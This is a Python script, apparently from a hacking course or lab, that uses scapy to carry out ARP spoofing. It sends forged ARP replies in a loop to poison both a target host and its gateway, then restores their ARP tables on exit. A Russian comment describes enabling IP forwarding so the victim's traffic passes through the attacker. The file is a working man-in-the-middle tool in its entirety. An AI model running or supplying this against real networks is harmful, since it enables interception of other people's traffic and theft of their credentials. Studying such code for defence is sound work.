#!/usr/bin/env/ python

import scapy.all as scapy
from time import sleep

ip_windows = "10.0.2.7"
ip_router = "10.0.2.1"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    ether_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether_broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
    target_ip = "10.0.2.7"
    gateway_ip = "10.0.2.1"
    send_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            send_packets_count += 2
            print(f"\r[+] Packets sent: {str(send_packets_count)}.", end='')
            sleep(2)
    except KeyboardInterrupt:
        print("[+] Detecting CTRL+C. Quiting...")
        print("[+] Resetting ARP tables... ")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

# echo 1> /proc/sys/net/ipv4/ip_forward для разрешения прохождения трафика через комп
